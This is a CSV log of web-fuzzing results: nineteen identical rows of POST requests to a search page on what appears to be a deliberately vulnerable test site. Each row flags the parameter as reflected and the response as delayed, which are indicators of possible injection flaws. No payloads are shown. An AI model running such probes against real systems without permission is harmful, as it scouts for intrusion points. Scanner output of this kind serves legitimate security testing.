id_fuzz,#,URL,Method,StatusCode,SearchKeyword,TimeDelay
id_fuzz_1,78,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,79,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,80,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,81,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,82,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,83,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,84,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,85,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,86,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,87,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,88,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,89,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,90,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,91,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,92,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,93,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,94,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,95,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,96,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
